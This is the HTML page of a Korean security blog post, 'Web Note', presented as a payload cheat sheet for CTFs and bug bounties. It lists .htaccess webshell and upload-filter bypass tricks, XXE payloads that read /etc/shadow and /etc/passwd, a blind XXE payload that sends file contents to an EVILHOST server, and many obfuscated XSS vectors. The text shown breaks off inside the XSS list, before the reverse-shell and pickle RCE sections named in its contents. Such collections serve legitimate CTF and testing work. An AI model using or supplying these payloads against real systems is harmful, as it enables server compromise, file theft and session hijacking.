@@ -1,0 +1,411 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="워게임, CTF 및 버그바운티를 하다 보면 생각 외로 필요한 것들이 많습니다. 하지만 그 많은 것들을 항상 기억하고 있기는 힘들다는 것을 알고 있기 때문에 앞으로 하나 하나 중요한 페이로드들을 정리를 해나갈 것 이고, 이번 글의 가독성은 저의 기준으로 작성하겠습니다.  .htaccess&amp;#35;PHP 엔진을 끄고, PHP 소스 코드를 확인해야 할 경우 1p">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Web Note">
+<meta property="og:url" content="http://example.com/2021/01/15/2021-01-15-note/index.html">
+<meta property="og:site_name" content="Home">
+<meta property="og:description" content="워게임, CTF 및 버그바운티를 하다 보면 생각 외로 필요한 것들이 많습니다. 하지만 그 많은 것들을 항상 기억하고 있기는 힘들다는 것을 알고 있기 때문에 앞으로 하나 하나 중요한 페이로드들을 정리를 해나갈 것 이고, 이번 글의 가독성은 저의 기준으로 작성하겠습니다.  .htaccess&amp;#35;PHP 엔진을 끄고, PHP 소스 코드를 확인해야 할 경우 1p">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2021-01-15T00:00:00.000Z">
+<meta property="article:modified_time" content="2021-01-28T07:02:18.483Z">
+<meta property="article:author" content="Jeongwon Jo">
+<meta property="article:tag" content="CheatSheet">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Web Note</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/projects_url">Projects</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2021/01/18/2021-01-18-new-year/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2021/01/03/2021-01-03-TetCTF/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2021/01/15/2021-01-15-note/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2021/01/15/2021-01-15-note/&text=Web Note"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2021/01/15/2021-01-15-note/&title=Web Note"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2021/01/15/2021-01-15-note/&is_video=false&description=Web Note"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Web Note&body=Check out this article: http://example.com/2021/01/15/2021-01-15-note/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2021/01/15/2021-01-15-note/&title=Web Note"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2021/01/15/2021-01-15-note/&title=Web Note"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2021/01/15/2021-01-15-note/&title=Web Note"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2021/01/15/2021-01-15-note/&title=Web Note"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2021/01/15/2021-01-15-note/&name=Web Note&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2021/01/15/2021-01-15-note/&t=Web Note"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#htaccess"><span class="toc-number">1.</span> <span class="toc-text">.htaccess
+</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Upload-Function"><span class="toc-number">2.</span> <span class="toc-text">Upload Function
+</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XXE-Original"><span class="toc-number">3.</span> <span class="toc-text">XXE (Original)
+</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XXE-feat-svg"><span class="toc-number">4.</span> <span class="toc-text">XXE (feat svg)
+</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS"><span class="toc-number">5.</span> <span class="toc-text">XSS
+</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DOMPurify-Bypass"><span class="toc-number">6.</span> <span class="toc-text">DOMPurify Bypass
+</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSP-Bypass"><span class="toc-number">7.</span> <span class="toc-text">CSP Bypass
+</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reverse-Shell"><span class="toc-number">8.</span> <span class="toc-text">Reverse Shell
+</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Python-Pickle-RCE-PoC"><span class="toc-number">9.</span> <span class="toc-text">Python Pickle RCE PoC
+</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Web Note
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Jeongwon Jo</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2021-01-15T00:00:00.000Z" itemprop="datePublished">2021-01-15</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/Note/">Note</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/CheatSheet/" rel="tag">CheatSheet</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p><strong>워게임, CTF 및 버그바운티를 하다 보면 생각 외로 필요한 것들이 많습니다. 하지만 그 많은 것들을 항상 기억하고 있기는 힘들다는 것을 알고 있기 때문에 앞으로 하나 하나 중요한 페이로드들을 정리를 해나갈 것 이고, 이번 글의 가독성은 저의 기준으로 작성하겠습니다.</strong></p>
+<hr>
+<h2 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess<br></h2><p><span style="color:#21C587">&#35;</span><strong>PHP 엔진을 끄고, PHP 소스 코드를 확인해야 할 경우</strong><br></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_flag engine off</span><br></pre></td></tr></table></figure>
+<p><strong>위와 같이 .htaccess 파일을 업로드 해주면 PHP 코드가 실행이 되지 않고, PHP 코드 자체가 출력이 됩니다.</strong><br><br></p>
+<p><span style="color:#21C587">&#35;</span><strong>php 확장자를 다른 문자열로 변경할 경우</strong><br></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .burp</span><br></pre></td></tr></table></figure>
+<p><strong>위와 같이 .htaccess 파일을 업로드 하게 되면 burp라는 확장자로 업로드 해도 PHP 코드가 실행됩니다. </strong><br><br></p>
+<p><span style="color:#21C587">&#35;</span><strong>.htaccess 파일 자체를 Webshell로 업로드 할 경우</strong><br><br><span style="color:#21C587">&#35;</span><strong>.htaccess 파일을 업로드 가능하지만 <code>&lt;?php</code>, <code>&lt;?</code>와 같은 문자열을 필터링 할 경우</strong><br></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php_flag zend.multibyte 1</span><br><span class="line">php_value zend.script_encoding &quot;UTF-7&quot;</span><br><span class="line">php_value auto_append_file .htaccess</span><br><span class="line">#+ADw?php phpinfo()+ADs</span><br></pre></td></tr></table></figure>
+<p><strong>위와 같이 .htaccess 파일을 업로드 할 경우 .htaccess 파일 자체로 Webshell로 사용할 수 있습니다.</strong><br><br></p>
+<p><span style="color:#21C587">&#35;</span><strong>exif_imagetype&#40;&#41; 함수를 이용해 이미지 타입을 검증하는 경우</strong><br><br><span style="color:#21C587">&#35;</span><strong>이미지 사이즈를 검증하는 경우</strong><br><br><span style="color:#21C587">&#35;</span><strong><code>&lt;?</code>, <code>&lt;?php</code>와 같은 문자열을 필터링하는 경우</strong><br></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#define test_width 1337</span><br><span class="line">#define test_height 1337</span><br><span class="line">AddType application&#x2F;x-httpd-php .burp</span><br><span class="line">php_flag zend.multibyte 1</span><br><span class="line">php_value zend.script_encoding &quot;UTF-7&quot;</span><br></pre></td></tr></table></figure>
+<p><strong>위와 같이 .htaccess 파일을 업로드 하면 xbm 파일로 인식을 하기 때문에 exif_imagetype&#40;&#41; 함수에 걸리지 않고, .htaccess 파일을 업로드 할 수 있습니다. 위 파일을 업로드 하고, burp라는 확장자로 Payload를 UTF-7로 인코딩해서 업로드 하면 Webshell 사용이 가능합니다.</strong><br><br></p>
+<p><strong>당연히 Payload를 업로드 할 때도, exif_imagetype&#40;&#41; 함수에 걸리지 않게 하기 위해 <code>#define~</code> 문을 적어줘야 합니다.</strong><br><br></p>
+<hr>
+<h2 id="Upload-Function"><a href="#Upload-Function" class="headerlink" title="Upload Function"></a>Upload Function<br></h2><p><span style="color:#21C587">&#35;</span><strong> Blacklisting Bypass</strong><br></p>
+<ul>
+<li>PHP → <code>.php</code>, <code>.phtm</code>, <code>phtml</code>, <code>.phps</code>, <code>.pht</code>, <code>.php2</code>, <code>.php3</code>, <code>.php4</code>, <code>.php5</code>, <code>.shtml</code>, <code>.pahr</code>, <code>.pgif</code>, <code>.inc</code><br></li>
+<li>ASP → <code>.asp</code>, <code>.aspx</code>, <code>.cer</code>, <code>.asa</code><br></li>
+<li>JSP → <code>.jsp</code>, <code>.jspx</code>, <code>.jsw</code>, <code>.jsv</code>, <code>jspf</code><br></li>
+</ul>
+<p><span style="color:#21C587">&#35;</span><strong> Whitelisting Bypass</strong><br></p>
+<ul>
+<li>file.jpg.php</li>
+<li>file.php.jpg</li>
+<li>file.php.blah123jpg</li>
+<li>file.php%00.jpt</li>
+<li>file.php\x00.jpt</li>
+<li>file.php%00</li>
+<li>file.php%20</li>
+<li>file.php%0d%0a.jpg</li>
+<li>file.php/</li>
+<li>file.php.\</li>
+</ul>
+<hr>
+<h2 id="XXE-Original"><a href="#XXE-Original" class="headerlink" title="XXE (Original)"></a>XXE (Original)<br></h2><p><span style="color:#21C587">&#35;</span><strong> XXE Original</strong><br></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--?xml version=&quot;1.0&quot; ?--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">burp</span> [<span class="meta">&lt;!ENTITY <span class="meta-keyword">burp</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/shadow&quot;</span>&gt;</span> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">lfi</span>&gt;</span><span class="symbol">&amp;burp;</span><span class="tag">&lt;/<span class="name">lfi</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><span style="color:#21C587">&#35;</span><strong> XXE to SSRF</strong><br></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--?xml version=&quot;1.0&quot; ?--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">burp</span> [<span class="meta">&lt;!ENTITY <span class="meta-keyword">burp</span> <span class="meta-keyword">system</span> <span class="meta-string">&quot;domain&quot;</span>&gt;</span> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ssrf</span>&gt;</span><span class="symbol">&amp;burp;</span><span class="tag">&lt;/<span class="name">ssrf</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><span style="color:#21C587">&#35;</span><strong> XXE (XInclude attacks)</strong><br></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">burp</span> <span class="attr">xmlns:xi</span>=<span class="string">&quot;http://www.w3.org/2001/XInclude&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">xi:include</span> <span class="attr">parse</span>=<span class="string">&quot;text&quot;</span> <span class="attr">href</span>=<span class="string">&quot;file:///etc/passwd&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">burp</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><span style="color:#21C587">&#35;</span><strong> XXE (php wrapper)</strong><br></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">burp</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">burp</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/read=convert.base64-encode/resource=****&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">lfi</span>&gt;</span><span class="symbol">&amp;burp;</span><span class="tag">&lt;/<span class="name">lfi</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<hr>
+<h2 id="XXE-feat-svg"><a href="#XXE-feat-svg" class="headerlink" title="XXE (feat svg)"></a>XXE (feat svg)<br></h2><p><span style="color:#21C587">&#35;</span><strong> XXE</strong><br></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; standalone=&quot;yes&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [ <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/issue&quot;</span> &gt;</span> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="attr">xmlns:xlink</span>=<span class="string">&quot;http://www.w3.org/1999/xlink&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.1&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">text</span> <span class="attr">font-size</span>=<span class="string">&quot;40&quot;</span> <span class="attr">x</span>=<span class="string">&quot;0&quot;</span> <span class="attr">y</span>=<span class="string">&quot;15&quot;</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span>                    </span><br></pre></td></tr></table></figure>
+<p><span style="color:#21C587">&#35;</span><strong> Blind XXE &amp; SSRF</strong><br></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;no”?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ENTY</span> [ <span class="meta">&lt;!ENTITY <span class="meta-keyword">XXE</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/issue”&gt; ]&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">&lt;svg xmlns:svg=”http://www.w3.org/2000/svg&quot;</span> <span class="meta-keyword">xmlns</span>=”http://www.w3.org/2000/svg<span class="meta-string">&quot; xmlns:xlink=&quot;</span>http://www.w3.org/1999/xlink<span class="meta-string">&quot; width=&quot;</span>200<span class="meta-string">&quot; height=”200&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">&lt;image xlink:href=&quot;http://EVILHOST:1337/SSRF?&amp;XXE;&quot; /&gt;</span></span><br><span class="line"><span class="meta">&lt;/svg&gt;</span></span><br></pre></td></tr></table></figure>
+<p><span style="color:#21C587">&#35;</span><strong> XXE &amp; XSS</strong><br></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.1&quot; standlone=&quot;no&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">svg</span> <span class="meta-keyword">PUBLIC</span> <span class="meta-string">&quot;-//W3C//DTD SVG 1.1//EN&quot;</span> <span class="meta-string">&quot;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">version</span>=<span class="string">&quot;1.1&quot;</span> <span class="attr">baseProfile</span>=<span class="string">&quot;full&quot;</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">rect</span> <span class="attr">style</span>=<span class="string">&quot;fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">    alert(<span class="string">&quot;XXE &amp; XSS&quot;</span>);</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><span style="color:#21C587">&#35;</span><strong> XXE &amp; Open Redirect</strong><br></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">code</span>&gt;</span></span><br><span class="line">  <span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">&quot;window.location=&#x27;URL&#x27;&quot;</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.rog/200/svg&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">rect</span> <span class="attr">width</span>=<span class="string">&quot;300&quot;</span> <span class="attr">height</span>=<span class="string">&quot;100&quot;</span> <span class="attr">style</span>=<span class="string">&quot;fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">code</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<hr>
+<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS<br></h2><p><span style="color:#21C587">&#35;</span><strong> Reflection XSS statement</strong><br></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">script tag</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="handlebars"><span class="xml">alert(1)<span class="tag">&lt;/<span class="name">scipt</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">onerror=alert;<span class="keyword">throw</span> <span class="number">1</span></span></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">&#123;onerror=alert&#125;<span class="keyword">throw</span> <span class="number">1</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;data:;base64,YWxlcnQoMSk=&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&lt;script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.2/angular.js&gt;<span class="tag">&lt;/<span class="name">script</span>&gt;</span>&lt;div/ng-app&gt;&lt;input/autofocus/ng-focus=$event.path|orderBy:&#x27;[].constructor.from([1],alert)&#x27;&gt;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">img tag</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">window.alert(1)</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">window[</span>&#x27;<span class="attr">eva</span>&#x27;+&#x27;<span class="attr">l</span>&#x27;](<span class="attr">alert</span>(<span class="attr">1</span>)) &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">_</span>=<span class="string">alert,_(/xss/)</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">_</span>=<span class="string">&#x27;e&#x27;</span>+&#x27;<span class="attr">val</span>&#x27;,<span class="attr">_</span>(<span class="attr">alert</span>(<span class="attr">1</span>)) &gt;</span></span><br><span class="line"></span><br><span class="line">svg tag</span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">&amp;#97&amp;#108&amp;#101&amp;#114&amp;#116&amp;#40&amp;#49&amp;#41</span>&gt;</span></span><br><span class="line">&lt;svg/onload=setTimeout(&#x27;\141\154\145\162\164\50\61\51&#x27;)&gt;</span><br><span class="line">&lt;svg/onload=&#x27;+/&quot;/+/onmouseover=1/+/[*/[]/+alert(1)//&#x27;&gt;</span><br><span class="line">  </span><br><span class="line">details tag</span><br><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">open</span> <span class="attr">ontoggle</span>=<span class="string">top.alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">open</span> <span class="attr">ontoggle</span>=<span class="string">top[</span>&#x27;<span class="attr">prompt</span>&#x27;](<span class="attr">1</span>)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">open</span> <span class="attr">ontoggle</span>=<span class="string">eval(</span>&#x27;<span class="attr">alert</span>(<span class="attr">1</span>)&#x27;) &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">open</span> <span class="attr">ontoggle</span>=<span class="string">eval(atob(</span>&#x27;<span class="attr">YWxlcnQoMSk</span>=<span class="string">&#x27;)) &gt;</span></span></span><br><span class="line"><span class="tag"><span class="string">&lt;details open ontoggle=eval(&#x27;</span>\<span class="attr">141</span>\<span class="attr">154</span>\<span class="attr">145</span>\<span class="attr">162</span>\<span class="attr">164</span>\<span class="attr">50</span>\<span class="attr">61</span>\<span class="attr">51</span>&#x27;) &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">open</span> <span class="attr">ontoggle</span>=<span class="string">eval(String.fromCharCode(97,108,101,114,116,40,49,41))</span> &gt;</span></span><br><span class="line">  </span><br><span class="line">iframe tag</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">&amp;#97&amp;#108&amp;#101&amp;#114&amp;#116&amp;#40&amp;#49&amp;#41</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">srcdoc</span>=<span class="string">&quot;&lt;img src=x:x onerror=alert(1)&gt;&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">location</span>=<span class="string">&#x27;javascri&#x27;</span><span 